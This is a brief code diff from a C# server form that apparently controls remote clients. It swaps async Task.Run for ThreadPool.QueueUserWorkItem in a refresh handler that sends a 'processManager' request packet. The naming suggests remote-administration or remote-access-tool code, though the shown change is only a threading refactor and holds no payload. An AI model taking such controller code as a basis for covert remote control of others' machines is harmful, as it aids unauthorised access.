@@ -52,9 +52,9 @@ namespace Server.Forms
             }
         }
 
-        private async void refreshToolStripMenuItem_Click(object sender, EventArgs e)
+        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            await Task.Run(() =>
+            ThreadPool.QueueUserWorkItem((o) =>
             {
                 MsgPack msgpack = new MsgPack();
                 msgpack.ForcePathObject("Packet").AsString = "processManager";
